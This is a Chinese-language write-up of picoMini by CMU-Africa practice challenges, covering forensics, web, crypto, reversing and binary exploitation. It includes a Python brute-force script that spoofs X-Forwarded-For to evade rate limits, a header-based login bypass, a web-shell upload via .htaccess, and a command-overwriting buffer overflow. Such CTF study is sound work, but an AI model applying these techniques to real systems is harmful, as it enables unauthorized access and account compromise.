---
title: picoMini by CMU-Africa 練習
published: 2025-11-16
updated: 2025-11-19
description: "picoMini by CMU-Africa 練習題目 Writeup"
image: "/assets/picoCTF/picoMiniByCMUAfricaPractice/cover.png"
tags:
  [
    "CTF Writeup",
    "picoCTF",
    "Misc",
    "Forensics",
    "Web",
    "Crypto",
    "Reverse",
    "pwnable",
  ]
category: "picoCTF"
draft: true
---

## General Skills

### \[Easy\] Log Hunt

下載`server.log`  
可以看到有一行 `INFO FLAGPART:` 後面接著 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855589.png)

把 log 裡面的 `INFO FLAGPART:` 全部找出來就能得到 flag 了

## Forensics

### \[Easy\] Riddle Registry

先把 `confidential.pdf` 下載下來  
打開之後有幾行文字被劃掉了

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855640.png)

用文字編輯器打開會看到作者的地方有一串很像 base64 的字串

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855682.png)

就找到 flag 了

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855741.png)

### \[Easy\] Hidden in plainsight

下載到一張 `img.jpg`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855834.png)

用 `exiftool` 找到一個 comment

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855887.png)

發現提示是 `steghide` 並且後面的 base64 decode 之後就是 passphrase

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855941.png)

```sh
 steghide extract -sf img.jpg
```

可以得到一個 `flag.txt`，並且得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010855996.png)

### \[Easy\] Flag in Flame

下載 `log.txt`  
把檔案拿去做 base64 decode 之後是一張 PNG

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856046.png)

圖片上的那一串 Hex decode 完就可以得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856104.png)

### \[Easy\] Corrupted file

打開下載下來的 `file` 可以發現這好像是一張 `.jpg`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856147.png)

`.jpg` 的 magic number 應該要是 `ff d8 ff e0`，但現在是 `5c 78 ff e0`，修正 magic number

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856193.png)

把 `file` 後面加上 `.jpg` 就可以看到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856241.jpg)

## Web

### \[Easy\] Crack the Gate 1

題目已知 email 是 `ctf-player@picoctf.org`，但不知道密碼  
在註解的地方可以看到很像 caesar cipher的文字，並且下面有 `Remove before pushing to production!`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856298.png)

把 `ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"` 拿去 decrypt 會發現登入可以透過加上 `"X-Dev-Access: yes"` 這個 Header 去 bypass

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856342.png)

可以從 source code 看出登入的路徑是 `/login`，欄位是 `email` 跟 `password`

```javascript
document
  .getElementById("loginForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    const formData = {
      email: document.getElementById("email").value,
      password: document.getElementById("password").value,
    };

    fetch("/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log(data);
        if (data.success) {
          prompt("Login successful!\nFlag:", data.flag);
        } else {
          alert("Invalid credentials");
        }
      })
      .catch((error) => console.error("Error:", error));
  });
```

```sh
curl -X POST "http://amiable-citadel.picoctf.net:51576/login"   -H "X-Dev-Access: yes"   -H "Content-Type: application/json"   -d '{"email":"ctf-player@picoctf.org","password":"1234"}'
```

成功得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856402.png)

### \[Medium\] Crack the Gate 2

這一題有基本的速率限制機制，會阻止來自相同來源的重複失敗嘗試，同時又給了一個 `passwords.txt` 要去 brute force 密碼，所以需要更改 `X-Forwarded-For` 讓每一次 request 都是不同的來源 IP

```python
import requests
import random

url = "http://amiable-citadel.picoctf.net:64938/login"

with open("passwords.txt", "r") as f:
    password_list = [line.strip() for line in f]

for password in password_list:
    fake_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    print(f"current fake ip: {fake_ip}")

    headers = {
        "X-Forwarded-For": fake_ip
    }

    data = {
        "email": "ctf-player@picoctf.org",
        "password": password
    }

    r = requests.post(url, headers=headers, data=data)

    print(f"[IP: {fake_ip}] Try password: {password} → {r.status_code}")
    print(r.text)

    if "false" not in r.text:
        print(f"Success! The password is: {password}")
        print(r.text)
        break
```

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856445.png)

### \[Medium\] byp4ss3d

這一題可以上傳圖片，加上是 `.php`，所以可以嘗試上傳 web shell

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856492.png)

先上傳 `.htaccess` 讓圖片也可以被當作 php 去執行

![alt text](/assets/picoCTF/picoMiniByCMUAfricaPractice/image.png)

然後上傳 `.php.jpg`，內容是簡單的 web shell  
Windows 一直把我的檔案辨識成異常檔案，所以我只能在虛擬機裡面操作

![alt text](/assets/picoCTF/picoMiniByCMUAfricaPractice/image-1.png)

到 `/images/test.php.jpg` 後面加上 `?cmd=` 就可以執行指令了

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856532.png)

通靈到 flag.txt 的位置

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856602.png)

把 flag.txt 的內容印出來就可以得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856652.png)

## Cryptography

### \[Medium\] Crack the Power

這題的 e 很小，如果 `m^e < n`，則不需要 mod， `c = m^e` ，只需要對 c 取 20 次整數根，嘗試 Small e Attack。

```python
import gmpy2

n = 386376273698621493303464281578577800913241420037523749740689251191626834661728606797079135683490399569535610983077162789945701685914505670949260831115348871112934310141724002468718062461380012185381101979184465706438417497121935544388728996558674331941918450859320488429870319416071086042947050532904337232713367496601794329984108885100435870305501964352947171384455413244567835672609901795526935939433307257666750867293411903758477024875838982752466758954972294019743743703080314027372450174301566069715691355858550012057582910861745512458555559008092690007119935596481566060068547928106796373301810194657232636333262353559342409181559826855896796274815543761080969972775811770457517141485085579473180857971449899988311847638423923174232062071821160925127045435670648781602951917910127559673487977318235783137713317782015306203685007113293060862923550204201996615886361308086115843201837808395160475490912402518878797792784126756166230366088622752671650575600426552846067238125861269938020014363163295845174957486210790024084820550360933912964157314371741254532689253108709952441581937478957506399997263982886286052356399162427616002569731831900502290281623628108680331546785529713252550535607953936304409918221799161450274091176263
e = 20
c = 640637430810406857500566702096274080123723748207686420381579475273059378076458958252646084522104121379647765184090310031680930194784521633906596392080006536717015167769872384003892043769501066336180246002918140657967387286628754967423432424340646270680815827102181180538191523822602754203251639310292509074764258470361192362596602819424227295188838843539602419593628734378881387238773996415874888485018026113499096600195258443920408381725179342927135200126403272581991194171190584620752520868678346998178035251134384552972307837244436646980440882223690128670605368587367306801637214420844094483615132548401305357420722727945198947271045632959634978821988836146980445842667625977221494728446927005410724818250861788957930250004614242458767767567224411817312989766181256455892433966400264046095387257086975640996977691201205917336879652796306957800575050367004669506403264549786269619267919784618254466270915214706083766251533119147115113809006753825675686446644287699596100804689130844525574932938877038017120516829937107559335912106997499576625102129926770002207474776895070149693640635903258898583748738270737773619792409935988249465150729426074001

m, exact = gmpy2.iroot(c, e)

print("m =", m)
print("is exact =", exact)

if exact:
    flag = int.to_bytes(int(m), length=(m.bit_length() + 7) // 8, byteorder='big').decode()
    print("flag =", flag)
```

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856699.png)

## Reverse Engineering

### \[Medium\] M1n10n'5_53cr37

用 jadx 去打開下載下來的 `minions.apk`  
在 `resources.arsc:/res/values/strings.xml` 裡面找到一個很像 base64 字串

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856744.png)

把 base64 拿去 decode 就會得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856782.png)

### \[Medium\] Pico Bank

從首頁下載 `pico-bank.apk`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856828.png)

在 `com.example.picobank.Login` 看到使用者 ` Johnson` 的密碼是 `tricky1990`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856881.png)

在 `resources.arsc:/res/values/strings.xml` 可以找到 `otp_value`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856926.png)

在 `com.example.picobank.OTP` 可以看到驗證 OTP 的路徑是 `server url` + `/verify-otp`

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010856972.png)

打 request 之後可以找到第二部分的 flag，後面有提示說另一半的 flag 在 app 裡面

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857013.png)

在 `com.example.picobank.MainActivity` 找到交易金額，看起來很像是二進制

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857057.png)

大部分金額都是七位數，但是有少部分是六位數，我在六位數的金額前面補零，拿去 decode 就得到前半段的 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857111.png)

## Binary Exploitation

### \[Medium\] Input Injection 1

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);

    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

可以透過 buffer overflow 去把後面的 c 蓋掉，進而執行想要執行的指令

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857156.png)

把 flag.txt 的內容印出來就可以得到 flag

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857207.png)

### \[Medium\] Input Injection 2

感覺這一題應該會跟上一題差不多  
首先從輸出的 username 位址以及 shell 位址可以知道，需要蓋掉的長度是 `a0 - d0 = 0x30 = 48` 個 byte  
然後從 source code 可以知道後面需要再加上指定的 shell `/bin/sh`  
接下來就可以跟 shell 互動了

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857254.png)

---

突然發現多了好幾個 Easy 題，順手寫一下  
writeup 就修一下再發 ฅ^•ﻌ•^ฅ

![](/assets/picoCTF/picoMiniByCMUAfricaPractice/IMG-20251119010857298.png)

學期中真的好累
